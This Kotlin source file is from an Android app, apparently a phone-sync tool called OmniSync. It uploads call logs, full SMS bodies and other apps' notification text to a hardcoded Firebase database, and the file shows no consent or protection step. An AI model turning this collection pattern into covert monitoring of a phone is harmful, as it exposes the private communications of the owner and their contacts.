package com.omnisync.phone

import android.util.Log
import com.google.firebase.database.FirebaseDatabase

object FirebaseManager {
    private const val TAG = "FirebaseManager"
    private val database = FirebaseDatabase.getInstance("https://omnisync-78f1e-default-rtdb.firebaseio.com/")

    fun uploadCalls(calls: List<DatabaseHelper.CallRecord>, onComplete: (successIds: List<Long>) -> Unit) {
        val ref = database.getReference("calls")
        val successIds = mutableListOf<Long>()
        var pending = calls.size

        if (pending == 0) {
            onComplete(emptyList())
            return
        }

        for (call in calls) {
            val data = mapOf(
                "phone_number" to call.number,
                "call_type" to call.type,
                "timestamp" to call.timestamp
            )
            ref.push().setValue(data)
                .addOnSuccessListener {
                    successIds.add(call.id)
                    pending--
                    if (pending == 0) onComplete(successIds)
                }
                .addOnFailureListener {
                    pending--
                    if (pending == 0) onComplete(successIds)
                }
        }
    }

    fun uploadSms(smsList: List<DatabaseHelper.SmsRecord>, onComplete: (successIds: List<Long>) -> Unit) {
        val ref = database.getReference("sms")
        val successIds = mutableListOf<Long>()
        var pending = smsList.size
        if (pending == 0) {
            onComplete(emptyList())
            return
        }
        for (sms in smsList) {
            val data = mapOf(
                "address" to sms.address,
                "body" to sms.body,
                "timestamp" to sms.timestamp
            )
            ref.push().setValue(data)
                .addOnSuccessListener {
                    successIds.add(sms.id)
                    pending--
                    if (pending == 0) onComplete(successIds)
                }
                .addOnFailureListener {
                    pending--
                    if (pending == 0) onComplete(successIds)
                }
        }
    }

    fun uploadNotifications(notifications: List<DatabaseHelper.NotificationRecord>, onComplete: (successIds: List<Long>) -> Unit) {
        val ref = database.getReference("notifications")
        val successIds = mutableListOf<Long>()
        var pending = notifications.size
        if (pending == 0) {
            onComplete(emptyList())
            return
        }
        for (note in notifications) {
            val data = mapOf(
                "package_name" to note.packageName,
                "title" to (note.title ?: ""),
                "text" to (note.text ?: ""),
                "timestamp" to note.timestamp
            )
            ref.push().setValue(data)
                .addOnSuccessListener {
                    successIds.add(note.id)
                    pending--
                    if (pending == 0) onComplete(successIds)
                }
                .addOnFailureListener {
                    pending--
                    if (pending == 0) onComplete(successIds)
                }
        }
    }
}